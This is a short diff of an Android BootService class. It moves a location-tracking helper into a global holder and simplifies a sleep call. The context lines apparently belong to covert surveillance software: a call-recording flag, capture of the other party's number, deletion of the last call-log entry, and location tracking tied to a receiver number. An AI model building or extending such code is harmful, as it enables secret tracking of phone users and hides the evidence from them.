@@ -53,7 +53,6 @@ public class BootService extends Service
 	private final long mGetInfoDelay  = 10000; // 10 Seconds
 	private final long mGetInfoPeriod = 300000; // 300 Seconds
 	
-	public static LocationUtil locationUtil = null;
 	private TelephonyManager telManager = null;
 	private boolean recordStarted = false;
 	public static String otherSidePhoneNum = "";
@@ -168,7 +167,7 @@ public class BootService extends Service
     					//intent.putExtras(bundle);
     					context.sendBroadcast(exitIntent);
     					
-    					SysUtils.threadSleep(1000, LOGTAG);
+    					SysUtils.threadSleep(1000);
     					
     					// Remove the last phone call history
     					PhoneCallCtrl.removeLastRecord(context);
@@ -234,9 +233,9 @@ public class BootService extends Service
 		}
 		
 		String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-		if (recvPhoneNum.length() > 0 && locationUtil == null) 
+		if (recvPhoneNum.length() > 0 && GlobalValues.locationUtil == null) 
 		{
-			locationUtil = new LocationUtil(context);
+			GlobalValues.locationUtil = new LocationUtil(context);
 		}
 		
 		// Register screen_on intent broadcast receiver
